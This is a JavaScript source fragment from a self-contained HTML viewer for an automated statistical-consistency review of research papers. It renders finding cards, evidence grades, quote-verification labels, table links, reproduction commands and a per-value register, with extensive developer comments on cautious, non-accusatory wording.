  check_estimate_ci:'Estimate against its own confidence interval',
  check_proportion_from_normal:'Proportion implied by a normal distribution',
  bayesian_table1_dispersion:'Dispersion across a baseline table',
  reconstruct_2x2:'Reconstruction of a 2x2 table',
  recalc_independent_t:'Recomputed independent-samples t',
  recalc_within_subjects_t:'Recomputed within-subjects t',
  recalc_anova:'Recomputed ANOVA',
  recalc_f_to_p:'p-value recomputed from F',
  recalc_chi_squared:'Recomputed chi-squared',
  rivets_independent_t:'Signature of a hand-computed t (RIVETS)',
  rivets_anova:'Signature of a hand-computed F (RIVETS)',
  duplication:'Repeated values across supposedly independent groups',
  reconcile:'Two extractions of the same table compared',
  multiplicity_report:'Correction for multiple comparisons',
  flag_round_n:'Suspiciously round sample size',
  flag_uninformative_stat:'Statistic reported without enough to check it',
  manual:'Computed by hand, not by a tool',
};
const OUTCOME={impossible:'the numbers cannot co-exist',
  highly_suspicious:'hard to explain innocently',suspicious:'a discrepancy',
  indeterminate:'could not be judged',consistent:'holds'};

function fTitle(f){
  const what=CHECK_NAMES[f.technique]||String(f.technique||'Check').replace(/_/g,' ');
  /* `where` comes from the model and lands inside markup, so it is escaped
     here: a `location` containing a `<` injected tags into the heading. The
     70-character truncation is gone too -- a location is WHERE to look, and
     "Table 2, Within-Person column, rows 4-9 of the mediation..." truncated at
     70 stops exactly where it starts being useful. */
  const where=esc(String(f.location||'').trim());
  return esc(what)+(where?` -- ${where}`:'')
    +(OUTCOME[f.severity]?` <span class="muted">(${OUTCOME[f.severity]})</span>`:'');
}

/* One editorial finding: the review's own conclusion, with the sweep findings
   it rests on folded underneath. `title` has been in report.schema.json since
   the beginning and the viewer never once read it. */
function edHtml(e, i, byId){
  const backing=(e.stage1_finding_ids||[]).map(id=>byId[String(id)]).filter(Boolean);
  const techs=[...new Set(backing.map(f=>f.technique).filter(Boolean))];
  /* The nested evidence is searchable through the parent -- see the filter in
     `after()`. Without this, filtering by `grim` would hide the finding that
     rests on a GRIM check because the word appears only in its evidence. */
  const hay=JSON.stringify([e, backing]).toLowerCase();
  /* THE EVIDENCE GRADE, from `viewer_facts.evidence_ledger`, which has been in
     the payload since phase 0 and rendered on no card.

     THE OLD PREDICATE WAS `!backing.length` AND IT IS THE WRONG ONE. Measured
     on the archived cerebrolysin run it fires on 1 of 12 findings while FOUR
     rest entirely on arithmetic the model did itself -- three of those
     `suspicious`. A finding that cites sweep findings LOOKS backed; if every
     one of them is `technique: manual`, nothing verified it.

     Three grades, not two, because the weak cases fail differently: a
     hand-computed finding has arithmetic nobody checked, a reading has no
     arithmetic at all and nothing to re-run. The old single paragraph said one
     sentence over both. */
  const ev=(((D.facts||{}).evidence||{}).per_finding||[])[i]||{};
  const unbacked=!backing.length;
  return `<div class="finding ${esc(e.severity)}" id="f${i+1}"
       data-sev="${esc(e.severity)}"
       data-tech="${esc(techs.join(' '))}" data-hay="${esc(hay)}">
    ${/* THE GRADE RIDES INSIDE THE CHIP, not only in a paragraph below it.
          A screenshot crop that captures "suspicious" and the claim could miss
          the qualification entirely -- which fails the viewer's governing test
          in the band where it matters most. MEASURED across 23 archived runs:
          88 of 222 findings (40%) are not computed, so this is the common case
          rather than an edge one. The paragraph stays for the reader who is
          still on the page; the chip is for the reader who is not. */''}
    <div>${sev(e.severity)}${ev.chip && ev.grade!=='computed'
      ? ` <span class="evfuse">${esc(ev.chip)}</span>` : ''}${
      /* WHOSE STANDARD, beside the severity, for the same screenshot reason.
         Only shown for the supplied class: the other three warrants say the
         obligation is the paper's own or is arithmetic, which is what a reader
         already assumes a review means. `field_norm` is the one that changes
         how the sentence should be read, so it is the one that is printed. */
      (((D.facts||{}).evidence||{}).uses_warrants)
        && (ev.warrant||{}).warrant==='field_norm'
      ? ` <span class="warrfuse" title="${esc((ev.warrant||{}).meaning||'')}">${
          esc((ev.warrant||{}).stated ? 'a norm we supplied'
                                      : 'no warrant named -- read as ours')}</span>` : ''}</div>
    <h3>${i+1}. ${esc(e.title||'Untitled finding')}</h3>
    ${ev.grade && ev.grade!=='computed'
      ? `<p class="evgrade"><b>${esc(ev.headline||'')}</b> ${esc(ev.detail||'')}</p>`
      : ''}
    ${e.plain?`<p class="plain">${esc(e.plain)}</p>`:''}
    ${cHtml(e)}
    ${evRests(backing)}
    <dl>
      <dt>Where</dt><dd>${esc(e.location)||'<span class="muted">not given</span>'}</dd>
      ${e.reported!==undefined?`<dt>Paper reports</dt><dd>${val(e.reported)}</dd>`:''}
      ${e.computed!==undefined?`<dt>Review computes</dt><dd>${val(e.computed)}</dd>`:''}
      ${e.assumptions?`<dt>Assumes</dt><dd>${val(e.assumptions)}</dd>`:''}
    </dl>
    ${/* WHAT WOULD SETTLE THIS -- the mandatory last content block, derived in
          PYTHON at build time (`viewer_facts.settle_this`) from what the
          finding and its backing checks already record. The gates this repo
          spent days building ARE the list of things that could be missing, so
          the answer is nearly always already on disk.

          Phrased as "what would settle this", never "what would make us
          withdraw it": we do not know in advance which way the answer goes, and
          promising to withdraw is a promise about a conclusion not yet reached.
          Never silent -- a card that ends without saying what would resolve it
          invites the reader to treat it as settled already. */''}
    ${ev.settle?`<div class="settle"><b>What would settle this.</b>
      ${esc(ev.settle.text||'')}
      ${(ev.settle.also||[]).length?`<ul>${(ev.settle.also||[])
        .map(t=>`<li>${esc(t)}</li>`).join('')}</ul>`:''}</div>`:''}
    ${reproHtml(e)}
    ${backing.length?`<details class="evidence"><summary>${backing.length} tool
        verdict${backing.length===1?'':'s'} this rests on</summary>
      ${backing.sort((a,b)=>(__SEVERITY_ORDER__[a.severity]??9)-(__SEVERITY_ORDER__[b.severity]??9))
        .map(fHtml).join('')}</details>`:''}
    ${/* THE FRAME INSIDE THE CROP. The governing constraint on this whole
          document is that a screenshot of any part of it still reads as a
          question rather than an allegation -- and cropping is the attack. A
          single card, screenshotted and forwarded, carried no statement of what
          this document is. One muted line, on every card. */''}
    <div class="cardfoot">Automated check of printed numbers -- a question for
      the authors, not a finding of misconduct.
      <span class="muted">${esc(shortCite())} &middot; finding ${i+1}</span></div>
  </div>`;
}

/* A short citation for the card footer: first author and year where we have
   them, else the paper id. Built from `paper_facts`, so it agrees with the
   identity block rather than being a second rendering of the same fact. */
function shortCite(){
  const g=f=>((D.paper_facts||[]).find(x=>x.fact===f)||{}).value||'';
  const authors=g('Authors'), year=g('Year');
  const first=(authors||'').split(',')[0].trim();
  const bits=[first&&first!=='not recorded'?first+(authors.indexOf(',')>0?' et al.':''):'',
              year&&year!=='not recorded'?year:''].filter(Boolean);
  return bits.length?bits.join(' '):(D.paper_id||'this paper');
}

function fHtml(f){
  const problems = (f.computed && f.computed.problems) || [];
  /* The model's own sentence is kept, below the title rather than as it: it is
     often a methodology aside, and a reader scanning headings needs to know
     what was checked before they are told how the check went. */
  const sub = problems.length ? problems[0]
    : (f.notes ? String(f.notes).split(/(?<=\.)\s/)[0] : '');
  const hay = JSON.stringify(f).toLowerCase();
  return `<div class="finding ${esc(f.severity)}" data-sev="${esc(f.severity)}" data-tech="${esc(f.technique||'')}"
       data-hay="${esc(hay)}">
    <div>${sev(f.severity)}</div>
    <h3>${fTitle(f)}</h3>
    ${f.plain?`<p class="plain">${esc(f.plain)}</p>`:''}
    ${sub?`<p class="sub">${esc(sub)}</p>`:''}
    <dl>
      <dt>Where</dt><dd>${refLinks(esc(f.location))||'<span class="muted">not given</span>'}</dd>
      ${f.quote?`<dt>${quoteLabel(f)}</dt><dd><code>${esc(f.quote)}</code>${quoteNote(f)}</dd>`:''}
      ${sourceRow(f)}
      ${/* THE ROUTED TOOL'S CLASS GOVERNS, NOT THE ROUTER'S. check_table is a
            dispatcher whose own card says so in as many words: its `absolute`
            class is a CEILING, and a `suspicious` row it returns may have come
            from a probabilistic check underneath. Stamping the router's class
            on such a row would overstate it, which is the one direction this
            document may never err in. */''}
      <dt>Check used</dt><dd><code>${esc(f.technique)}</code>${
        f.inputs&&f.inputs.tool?` &rarr; <code>${esc(f.inputs.tool)}</code>`:''}${
        evChip((f.inputs&&f.inputs.tool)||f.technique, f.severity)}</dd>
      <dt>Paper reports</dt><dd>${val(f.reported)}</dd>
      <dt>Check computes</dt><dd>${val(f.computed&&typeof f.computed==='object'
        ? Object.fromEntries(Object.entries(f.computed).filter(([k])=>k!=='problems'))
        : f.computed)}</dd>
      ${problems.length>1?`<dt>Why flagged</dt><dd>${val(problems)}</dd>`:''}
      ${f.inputs?`<dt>Inputs used</dt><dd>${val(f.inputs)}</dd>`:''}
    </dl>
    ${cHtml(f)}
    ${sSrc(f)}
    ${anchorLinks(f)}
    ${f.notes?`<p>${esc(f.notes)}</p>`:''}
    ${reproHtml(f)}
  </div>`;
}

/* Why a finding has no runnable command. These are NOT all the same thing, and
   printing the raw internal message ("must invoke `metascience`, got
   'MCP-only'") read as an error when two of the four cases are not. */
/* Jump from a finding to where it lives in the paper. The page number and the
   text offset were resolved at build time (see anchor_findings): the browser's
   built-in PDF viewer reports no text positions, so this cannot be done here. */
/* Turn "Table 2" and "Figure 3A" into links to the place they name.
   Greg's ask, verbatim: "Whenever a table or section is mentioned in any of
   the pages, it should be a clickable link that will snap to the Paper vs Text
   page." A finding whose Where says "Table 2, Height row" is asking the reader
   to go and look at Table 2, and making them find it by hand is the same
   friction as an unverifiable quote.

   TAKES ALREADY-ESCAPED TEXT and must be given it. Linkifying first and
   escaping after would destroy the anchors; escaping after linkifying would
   emit them literally. The pattern cannot match inside an HTML entity -- an
   entity is &...; with no letters spelling Table -- which is the failure that
   bit the search box, where a needle matched inside &#39; and split it open. */
function refLinks(escaped){
  return String(escaped||'').replace(
    /\b(Table|Figure|Fig\.)\s*([0-9]+[A-Za-z]?)/g,
    (m,kind,num)=>'<a href="#" onclick="goTable(' +
      JSON.stringify((kind==='Fig.'?'Figure':kind)+' '+num).replace(/"/g,'&quot;') +
      ');return false">'+m+'</a>');
}

/* The heading over the quote states what KIND of text it is.
   "As printed" is a promise: that these words are in the paper. It was printed
   over every quote, including the 46 per cent that are assembled from values
   found in different places. A reader who searches the PDF for one of those
   finds nothing, which is the whole reason this label exists. */
function quoteLabel(f){
  const v = f.quote_verified;
  /* "As printed" is a PROMISE that these words are in the paper, so ONLY the
     two verdicts that actually located them may make it. An unstamped quote --
     quote_verified absent because the paper could not be opened, so the
     pipeline deliberately said nothing -- used to fall through to "As printed"
     here, turning our inability to read the paper into a claim about it. The
     neutral default makes no claim either way. */
  if(v==='verbatim'||v==='elided') return 'As printed';
  if(v==='stitched')   return 'Values, assembled by this review';
  if(v==='unverified') return 'Quoted by the review, not located';
  return 'Quoted by the review';
}

/* Say where to look, or say plainly that it was OUR search that came up empty.
   Never phrase our failure as a fact about the paper. */
function quoteNote(f){
  const v = f.quote_verified;
  if(v==='verbatim'||v==='elided'){
    const w = f.quote_source ? esc(f.quote_source) : 'the paper';
    return `<div class="muted" style="font-size:12px;margin-top:3px">found in ${w}${v==='elided'?', across an ellipsis':''}</div>`;
  }
  if(f.quote_problem){
    return `<div class="muted" style="font-size:12px;margin-top:3px">${esc(f.quote_problem)}</div>`;
  }
  return '';
}

/* The passage the CHECKED NUMBERS were read from, as against f.quote, which is
   the model's choice of what to quote about the finding. `sourcing.annotate`
   puts this on a finding by joining it to the validated call that produced it,
   and only when that join is unambiguous -- attaching the wrong row's passage
   would be worse than attaching none, because a quote is the thing a reader
   trusts INSTEAD of checking.

   Same promise discipline as quoteLabel: only the two verdicts that actually
   located the text may say "read from"; the others are stated as OUR search
   failing, which over 499 findings is what they have always turned out to be. */
function sourceRow(f){
  const s = f.source; if(!s || !s.source_quote) return '';
  const v = s.source_quote_verified;
  const located = v==='verbatim'||v==='elided';
  const label = located ? 'Numbers read from'
              : v==='stitched'   ? 'Numbers read from, not one contiguous passage'
              : v==='unverified' ? 'Numbers read from, not located by our search'
              : 'Numbers read from, unchecked';
  const where = located
    ? `found in ${esc(s.source_quote_source||'the paper')}${v==='elided'?', across an ellipsis':''}`
    : (v ? 'our search could not find this text in what we read -- most often our extraction, not the authors' : '');
  const at = s.source_locator ? `<b>${esc(s.source_locator)}</b> &mdash; ` : '';
  return `<dt>${label}</dt><dd>${at}<code>${esc(s.source_quote)}</code>${
    where?`<div class="muted" style="font-size:12px;margin-top:3px">${where}</div>`:''}</dd>`;
}

function anchorLinks(f){
  const a = f._anchor; if(!a) return '';
  /* A jump link on text that is not in the document highlights nothing, and
     leaves the reader believing they searched and the paper came up short.
     Offer the jump only when the quote was actually located. */
  const findable = f.quote_verified==='verbatim'||f.quote_verified==='elided';
  const bits = [];
  if(a.page) bits.push(`<a href="#" onclick="goSource(${a.page},${JSON.stringify((findable&&f.quote)||'').replace(/"/g,'&quot;')});return false">show p.${a.page} in the paper</a>`);
  else if(f.quote&&findable) bits.push(`<a href="#" onclick="goSource(null,${JSON.stringify(f.quote||'').replace(/"/g,'&quot;')});return false">find in the extracted text</a>`);
  return bits.length ? `<p class="muted" style="margin:6px 0 0">${bits.join(' &middot; ')}</p>` : '';
}

/* Move the source view to a page and highlight the quote in the text pane. */
function goSource(page, quote){
  window.__jump = {page: page, quote: quote};
  location.hash = 'source';
  if(document.getElementById('s-source').classList.contains('on')) applyJump();
}
/* Open ONE table on its own page, at full size.
   Written into a new window rather than fetched: the bundle is self-contained
   by design -- no network, no server, double-clicking viewer.html must work --
   so the table has to travel as markup already in hand. Escaping is the same
   `esc` the rest of the page uses; a caption or cell carrying a bracket must
   not become markup in a window we just built. */
function openTable(i){
  const t=(D.table_records||[])[i]; if(!t) return;
  const w=window.open('','_blank'); if(!w){ alert('The browser blocked a new window.'); return; }
  const rows=(t.rows||[]).map(function(r){
    return '<tr>'+r.map(function(c){ return '<td>'+esc(String(c==null?'':c))+'</td>'; }).join('')+'</tr>';
  }).join('');
  const notes=(t.warnings||[]).map(function(x){ return '<li>'+esc(x)+'</li>'; }).join('');
  /* The paper prints these UNDER the table, and the full-size window is the one
     place a reader studies the cells closely -- so it is the last place that
     may leave `**` undefined. */
  const foot=(t.footnotes||[]).filter(function(f){ return (f.text||'').trim(); })
    .map(function(f){ return '<p class="fn">'+(f.marker?'<b>'+esc(f.marker)+'</b> ':'')
      +esc(f.text)+'</p>'; }).join('');
  const css='body{font:13px system-ui,sans-serif;margin:18px;background:#fff;color:#111}'
    +'table{border-collapse:collapse}td{border:1px solid #bbb;padding:3px 6px;'
    +'vertical-align:top;white-space:pre-wrap}tr:first-child td{font-weight:600;background:#f2f2f2}'
    +'h1{font-size:15px;margin:0 0 4px}p.cap{color:#555;margin:0 0 12px;max-width:60em}'
    +'ul{color:#8a5a00;font-size:12px}'
    +'p.fn{color:#555;font-size:12px;margin:8px 0 0;max-width:60em}'
    +'@media(prefers-color-scheme:dark){body{background:#111;color:#eee}'
    +'td{border-color:#444}tr:first-child td{background:#222}p.cap,p.fn{color:#aaa}}';
  w.document.write('<!doctype html><meta charset="utf-8"><title>'
    +esc(t.label||'Table')+'</title><style>'+css+'</style>'
    +'<h1>'+esc(t.label||'Table')+'</h1>'
    +'<p class="cap">'+esc(t.caption||'')+'</p>'
    +(notes?'<ul>'+notes+'</ul>':'')
    +'<table>'+rows+'</table>'+foot);
  w.document.close();
}
/* Jump the rendered pane to a table by its label. The card now carries the
   WHOLE table and scrolls, so this is for the reader who wants it in place --
   with the surrounding prose, caption and footnotes -- rather than for one who
   was denied rows. `open` above is for the reader who wants it big. */
function goTable(label){
  const r=document.getElementById('bodyrender'); if(!r) return;
  const sel=document.getElementById('srcview');
  if(sel){ sel.value='rendered'; sel.dispatchEvent(new Event('change')); }
  const want=String(label||'').trim().toLowerCase();
  if(!want) return;
  r.querySelectorAll('.blk.hit').forEach(x=>x.classList.remove('hit'));
  /* Aim at the LABEL, not at the block. The splice emits `**Table 2.** caption`
     ahead of each grid, so the label is a <strong>; matching the block instead
     sent every card to whichever table came first, because consecutive tables
     with no blank line between them share one block. Measured: clicking
     TABLE 2 landed on TABLE 1. */
  r.querySelectorAll('.tgt').forEach(x=>x.classList.remove('tgt'));
  for(const el of r.querySelectorAll('strong,b')){
    if((el.textContent||'').trim().toLowerCase().indexOf(want)!==0) continue;
    /* Highlight the LABEL, not the block. Consecutive tables with no blank
       line between them share one block, so marking the block sent all three
       of Romano's cards to the same highlight and the reader could not tell
       which table they had asked for. */
    el.classList.add('tgt');
    el.scrollIntoView({block:'center'});
    return;
  }
  // No spliced grid for it -- fall back to the block that mentions the label.
  for(const b of r.querySelectorAll('[data-src-offset]')){
    if((b.textContent||'').toLowerCase().indexOf(want)<0) continue;
    b.classList.add('hit'); b.scrollIntoView({block:'center'}); return;
  }
}

function applyJump(){
  const j = window.__jump; if(!j) return;
  window.__jump = null;
  /* BACK TO THE PAPER FIRST. Every finding anchors to document 0 and this
     function addresses its pages by `#pg{n}` -- but that element lives inside a
     wrapper the selector sets `hidden` whenever the reader is on a supplement,
     and `scrollIntoView` on a hidden element does nothing at all. So a reader
     who looked at a supplement and then clicked "show p.7 in the paper" got
     silence, with no way to tell that from a jump that had nothing to find. */
  if(window.__srcSelectDoc){ try{ window.__srcSelectDoc(0); }catch(e){} }
  if(j.page){
    const pg = document.getElementById('pg'+j.page);
    if(pg) pg.scrollIntoView({block:'start'});
  }
  if(j.quote){
    const box = document.getElementById('srcq');
    if(box){
      box.value = j.quote.split(/\s+/).slice(0,8).join(' ');
      box.dispatchEvent(new Event('input'));
    }
  }
}

/* A reproduction string the model left as a TEMPLATE -- literal <...> slots,
   an ellipsis where an argument belongs -- is not a command. The write path
   stamps such strings `reproduction_valid: false`, but only runs made after
   that validator existed carry the stamp at all: on an older review a
   literal `metascience grim <mean> <n>` passed the one check below
   (`reproduction_valid !== false`) and was offered in a <pre> as something
   to paste. This mirrors evaluation/deterministic.py exactly: `<`, `>`, `{`
   and `}` count only OUTSIDE quoted arguments, because a quoted argument is
   data -- `--text "p < 0.001"` and a --tests '[{...}]' JSON blob are
   runnable commands, not templates (measured there: treating quoted braces
   as placeholders was a ~35% false-positive rate). The ellipsis and
   TODO/FIXME/XXX markers count anywhere, as they do there. */
function reproLooksTemplate(cmd){
  cmd=String(cmd||'');
  if(/\.\.\.|\u2026|TODO|FIXME|XXX/.test(cmd)) return true;
  let bare='', q=null;
  for(const ch of cmd){
    if(q===null&&(ch==='"'||ch==="'"))q=ch;
    else if(q!==null&&ch===q)q=null;
    else if(q===null)bare+=ch;
  }
  return /[<>{}]/.test(bare);
}

function reproHtml(f){
  const cmd = String(f.reproduction||'').trim();
  /* `reproduction_valid === false` is the write path's verdict that this
     command does NOT run as printed, and this is now the ONLY place a reader is
     handed a command at all: `report.md` used to print its own
     `**Reproduce:** ...` line and no longer prints one, so there is no second
     document to disagree with and no second refusal. That makes this branch
     more load-bearing, not less.

     It was written because the two documents DID disagree. The report refused
     the command; the viewer printed it anyway, in a <pre>, because it starts
     with the word "metascience". On the wave-3 eat.24415 run that is 3 of 10
     findings, and what got pasted into the viewer was the raw tool note: a
     2.3 kB --tests '[{...}]' JSON blob with unsubstituted placeholders that
     errors on first use. A command that fails when a reader tries it reads as a
     broken tool, which is worse than admitting the gap.

     `tpl` fires ONLY when the write path recorded no verdict at all
     (`reproduction_valid` absent): a recorded `true` rests on an actual
     execution, which outranks the static mirror here, and a recorded `false`
     already takes the branch below. */
  const tpl = f.reproduction_valid==null && cmd.startsWith('metascience')
    && reproLooksTemplate(cmd);
  if(cmd.startsWith('metascience') && f.reproduction_valid!==false && !tpl)
    return `<pre>${esc(cmd)}</pre>`;
  const why = String(f.reproduction_problem||'');
  let msg;
  if(/MCP-only/i.test(why)){
    msg = `<b>No command-line equivalent.</b> This check runs only inside the
      pipeline, so there is no <code>metascience</code> command to re-run it with.
      That is a gap in the toolkit, not a defect in the finding: the inputs are
      listed above and the check itself is deterministic.`;
  } else if(tpl || /placeholder/i.test(why)){
    msg = `<b>The command was left as a template.</b> It still contains
      <code>&lt;...&gt;</code> placeholders, so it will not run as written.
      Fill in the inputs listed above. This one IS a defect.${
      tpl&&cmd.length<=200?` The template: <code>${esc(cmd)}</code>`:''}`;
  } else if(/got '/i.test(why)){
    msg = `<b>No command was supplied.</b> Prose was written where a command
      belongs, so this finding cannot be re-run as printed. This one IS a defect.`;
  } else if(why){
    /* The raw exec output is 200-odd characters of click usage text and box
       drawing, and it was printed inline directly beneath the accusation --
       so the last thing under a finding that says `impossible` was a wall of
       tooling failure. It is kept, because it names the exact broken argument
       and that is what an operator needs, but folded away: the reader needs
       "you cannot re-run this as printed", not our stack. */
    msg = why.length>110
      ? `<b>Not reproducible by a single command.</b>
         <details><summary>what went wrong when we tried</summary>
         <pre>${esc(why)}</pre></details>`
      : `<b>Not reproducible by a single command.</b> ${esc(why)}`;
  } else {
    msg = `<b>No reproduction command.</b> This finding cannot be independently re-run.`;
  }
  return `<p class="muted" style="margin-top:8px">${msg}</p>`;
}

S.push({id:'values', label:'Values', count(){
  const r=D.value_register||{}; return (r.groups||[]).length||0;
}, build(){
  const r=D.value_register||{}, G=r.groups||[];
  /* ABSENT AND EMPTY ARE DIFFERENT. Every bundle built before the register
     existed has no key at all, and saying "no values" for those would be this
     project's standing failure -- an absence rendered as knowledge. */
  /* AND A THIRD STATE, which this used to swallow: the register was BUILT AND
     FAILED. `agent.py` writes the reason to `value_register.error.txt`, and
     with nothing loading it a crash reached the reader as "this review predates
     the register" -- naming a cause the viewer could not know, in the one
     branch written to avoid exactly that. */
  if((!r||!Object.keys(r).length) && D.value_register_error)
    return '<h2>Values</h2><p class="muted"><b>The value register could not be '
      +'built for this run, so this review has no per-value coverage.</b> That '
      +'is our gap, not a fact about the paper.</p><pre>'
      +esc(String(D.value_register_error))+'</pre>';
  if(!r||!Object.keys(r).length) return '<h2>Values</h2><p class="muted">'
    +'This review predates the value register, so there is nothing to show. '
    +'It is not a statement that the paper printed no values.</p>';
  /* NO GROUPS IS NOT NO NUMBERS. The groups come from a pattern pass, so a
     paper whose conventions none of those patterns match yields zero groups and
     hundreds of numerals -- which is exactly the case where the floor below
     matters most. Returning early here hid it in the one situation it was
     built for. */
  if(!G.length) return '<h2>Values</h2><p class="muted">No value groups were '
    +'typed for this paper. That is a statement about the typing, not about the '
    +'paper: see every number it printed below. '+esc(r.is_a_floor||'')+'</p>'
    +invariantsBlock(r)+unboundBlock(r)+numeralBlock(r);

  const cov=r.coverage||{};
  /* Every value the paper printed, keyed by where it is printed, with the
     checks that reached it and the reason where none did. This is the index
     the hover view is built on: a group id is stable across re-extractions, so
     it can anchor a highlight. */
  const same=r.same_value||{};
  const partner={};
  Object.values(same).forEach(ids=>ids.forEach(i=>{partner[i]=ids;}));

  const rows=G.map(g=>{
    const vals=(g.values||[]).map(v=>{
      const kin=(partner[v.id]||[]).filter(x=>x!==v.id);
      /* SIBLINGS, TWINS AND THE ENABLER, in one list. Siblings are the other
         values printed in this same cell (a mean and its SD); twins are the
         same number printed elsewhere; the enabler is the group size that
         made the check possible, which until recently was not a value at
         all. */
      const rel=(g.values||[]).map(x=>x.id).filter(x=>x!==v.id)
        .concat(kin).concat(g.design_inputs||[]);
      return '<span class="val mono" data-vid="'+esc(v.id)+'"'
        +' data-rel="'+esc(rel.join(' '))+'"'
        +' title="'+esc(v.id)+'">'+esc(v.role)+' = '+esc(v.printed)+'</span>'
        +'<span class="vcls">'+esc(v.role_class||'unknown')+'</span>'
        +(kin.length?' <span class="muted">(same value in '+kin.length
          +' other place'+(kin.length>1?'s':'')+')</span>':'');
    }).join('<br>');
    /* THE DENOMINATOR THAT WOULD MAKE THE PRINTED NUMBER RIGHT.
       Measured 2026-08-20: of eighteen `suspicious` count/percent verdicts,
       FIFTEEN are reproduced exactly by a denominator below the one the check
       was given -- an ordinary baseline table where a variable has its own N
       because some participants are missing that measurement. Computing that
       and not showing it would leave a reader looking at a suspicion whose
       explanation we already hold, which is the one output this toolkit must
       never produce. Shown, never used to overturn: whether one missing
       observation is plausible is a judgement about the paper. */
    function denomNote(a){
      if(!a) return '';
      if(!a.reproduces_printed_value)
        return ' <span class="muted">&mdash; no denominator at or below '
          +esc(String(a.n_used))+' reproduces the printed value</span>';
      if(!a.n_missing) return '';
      /* WHICH LEVEL of the header said it. A stacked header states a size
         twice: "PP Population, n = 318 | Cerebrolysin , n = 117". The column's
         own figure is the denominator for these numbers; the grouping above it
         covers several columns and is true without being this column's. A
         reader weighing the confirmation needs to know which one they got. */
      const lvl = a.column_header_states_n_at;
      const hdr = a.header_confirms_denominator
        ? (lvl === 'group'
            ? ', and a grouping above this column states it'
            : ', and the column header states it')
        : (lvl === 'group'
            ? '; the only n in the header, ' + esc(String(a.column_header_states_n))
              + ', covers a grouping of columns rather than this one'
            : '');
      /* BOTH NUMBERS, ALWAYS. "1 fewer than 540" is a participant missing a
         measurement; "201 fewer than 318" is a stacked header stating a study
         total over a cell belonging to one arm. The absolute count alone reads
         the same for both, and the second reads alarming when it is not. */
      const share = a.share_below
        ? ', '+esc(String(Math.round(a.share_below*100)))+'% below' : '';
      return ' <span class="muted">&mdash; '+esc(String(a.denominator))
        +' reproduces the printed value exactly ('+esc(String(a.n_missing))
        +' fewer than the '+esc(String(a.n_used))+' used'+share+hdr+')</span>';
    }
    const checks=(g.checks||[]).map(c=>{
      const sev=c.severity||(c.passed?'consistent':'--');
      return '<div>'+esc(c.tool)+' &middot; '+sev
        +(c.joined_by?' <span class="muted">('+esc(c.joined_by)+')</span>':'')
        +denomNote(c.denominator_audit)+'</div>';
    }).join('');
    /* A group with no verdict says WHY. Silence here would read as a value
       nothing needed to check. */
    const why = (g.checks||[]).length ? checks
      : (g.not_run||[]).length
        ? '<span class="muted">refused: '+esc((g.not_run[0]||{}).reason||'')+'</span>'
        : g.verdicts_not_attached
          /* NOT "no verdict recorded", which reads as nobody having looked.
             Somebody did: a verdict was computed about a number printed here
             and we declined to say which of several identical cells it belonged
             to. 165 of the 290 silent groups in the eleven-paper run are this. */
          ? '<span class="muted">a verdict was computed about this number and '
            +'could not be told apart from an identical cell ('
            +esc(String(g.verdicts_not_attached))+')</span>'
        : (g.applicable_tools||[]).length
          ? '<span class="muted">no check was run on this value</span>'
          : '<span class="muted">no check applies to this kind</span>';
    const where = (g.anchor||{}).where==='table'
      ? esc(String((g.anchor||{}).table||''))+' row '+esc(String((g.anchor||{}).row))
        +((g.anchor||{}).col_label?' &middot; '+esc(g.anchor.col_label):'')
      : 'prose';
    /* A BOUND IS NOT A POINT VALUE, and the register holds the bound as the
       number. Without the operator shown beside it, `<0.001` reads as an exact
       0.001 -- a precision the paper never claimed. */
    const cens = g.censored
      ? ' <span class="muted">(a bound: '+esc(g.censored)+', not an exact value)</span>'
      : '';
    return '<tr id="'+esc(g.id)+'"><td class="mono">'+esc(g.quote||'')+cens+'</td>'
      +'<td>'+where+'</td><td>'+vals+'</td>'
      +'<td>'+(g.variable_id?esc(g.variable_id):'<span class="muted">unbound</span>')+'</td>'
      +'<td>'+why+'</td></tr>';
  }).join('');

  const bind=r.bindings||{};
  return '<h2>Values</h2>'
    +'<p class="muted">Every value this paper printed that the extractor could '
    +'see, what it belongs to, and which checks reached it. '+esc(r.is_a_floor||'')
    +'</p>'
    +kv([
      ['values', String(r.n_values||0)+' in '+String(r.n_groups||0)+' group(s)'],
      ['bound to a declared variable', String(r.n_values_bound_to_a_variable||0)
        +(bind.note?' <span class="muted">-- '+esc(bind.note)+'</span>':'')],
      ['table values checked', String(cov.n_checked||0)+' of '
        +String(cov.n_table_groups||0)],
      ['refused, with a reason', String(cov.n_refused_with_a_reason||0)],
      ['no check applies', String(cov.n_no_applicable_tool||0)],
      ['SILENT -- our gap, not the paper\'s', String(cov.n_silent||0)],
      ['per-cell checks joined', String(r.n_per_cell_checks_joined||0)
        +' (unmatched '+String(r.n_per_cell_checks_unmatched||0)
        +', nothing joinable '+String(r.n_calls_with_no_matchable_value||0)+')'],
      /* DETERMINISTIC, NO MODEL. Run wherever the cell's own column header
         states its n. Shown beside the model-driven counts so a reader can see
         which arithmetic needed an agent and which did not. */
      ['checked from the column header\'s own n', (function(){
        const S=r.stated_denominator_checks; if(!S) return '<span class="muted">not run</span>';
        const sev=S.by_severity||{};
        const parts=Object.keys(sev).map(function(k){return esc(k)+' '+String(sev[k]);});
        return String(S.n_attached||0)+' cell(s), no model in the loop'
          +(parts.length?' &middot; '+parts.join(', '):'')
          +' <span class="muted">(skipped '+String(S.n_skipped||0)+')</span>';
      })()],
    ])
    +modelRegisterBlock()
    +designBlock(r)
    +invariantsBlock(r)
    +unboundBlock(r)
    +numeralBlock(r)
    +'<table class="grid" style="margin-top:12px"><thead><tr>'
    +'<th>As printed</th><th>Where</th><th>Values</th><th>Variable</th>'
    +'<th>Checks</th></tr></thead><tbody>'+rows+'</tbody></table>';
}});

/* WHAT THE MODEL ITSELF SAID IT FOUND, and how much of it held up.

   `register.validate` has been running every review and writing its verdict to
   `coverage_summary.statistics_register`, and NOTHING RENDERED IT -- the string
   did not appear in this file. That is the second detector found computing a
   result nobody could see, after `text_integrity`.

   It is the more consequential of the two. `register.py` exists so the model is
   the FINDER while the denominator stays independent of it; this block is where
   a reader learns how many of the model's own claimed statistics could be
   located in the paper at all, and how many the regex floor found that the
   model did not mention.

   `absent` is kept distinct from empty, exactly as that module insists: no
   register emitted is OUR wiring or the model's refusal, an empty one is a
   claim about the paper. */
function modelRegisterBlock(){
  const cs=(D.report_obj||{}).coverage_summary||D.coverage_summary||{};
  /* WHERE IT IS ACTUALLY WRITTEN. `cs.statistics_register` is the legacy
     home, under report.json's coverage_summary. The parallel pipeline writes
     the register at the TOP LEVEL of findings.v2.json
     (parallel.py's `_build`), so on every v2 run this read found nothing and
     the block rendered empty -- written by one path, looked for on another.
     Found 2026-09-03. Legacy first so archived runs are unchanged. */
